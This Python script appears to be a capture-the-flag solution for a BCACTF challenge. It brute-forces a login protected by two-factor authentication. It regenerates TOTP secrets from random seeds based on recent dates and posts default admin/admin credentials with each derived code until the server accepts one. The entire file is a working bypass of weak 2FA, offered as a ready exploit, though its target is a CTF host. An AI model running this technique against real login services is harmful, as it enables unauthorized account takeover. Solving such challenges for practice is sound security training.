import datetime
import random

import pyotp
import requests


# Function to generate the TOTP secret based on a given date
def generate_totp_secret(date_str):
    random.seed(date_str)
    SECRET_ALPHABET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567'
    return ''.join([random.choice(SECRET_ALPHABET) for _ in range(20)])

# Define the server URL and credentials
server = 'http://challs.bcactf.com:31772/'
username = 'admin'
password = 'admin'

# Try seeds for today, yesterday, and the day before yesterday
dates_to_try = [(datetime.datetime.today() - datetime.timedelta(days=i)).strftime('%Y-%m-%d') for i in range(20)]


for date_str in dates_to_try:
    # Generate the TOTP secret for the given date
    totp_secret = generate_totp_secret(date_str)
    print(f"Trying TOTP Secret for date {date_str}: {totp_secret}")

    # Create a TOTP object
    totp = pyotp.TOTP(totp_secret)

    # Generate the current TOTP code
    totp_code = totp.now()
    print(f"Generated TOTP Code: {totp_code}")

    # Prepare the data payload for the POST request
    data = {
        'username': username,
        'password': password,
        'totp': totp_code
    }

    # Send the POST request to the server
    response = requests.post(server,timeout=5, data=data)

    # Print the server response and the TOTP verification result
    print(f"Server Response for date {date_str}: {response.text}")
    print(f"TOTP Verification for date {date_str}: {totp.verify(totp_code)}")

    # Check if the login was successful
    if 'Invalid username/password.' not in response.text and '2FA code is incorrect.' not in response.text:
        print(f"Success with date {date_str} and TOTP Secret {totp_secret}")
        break
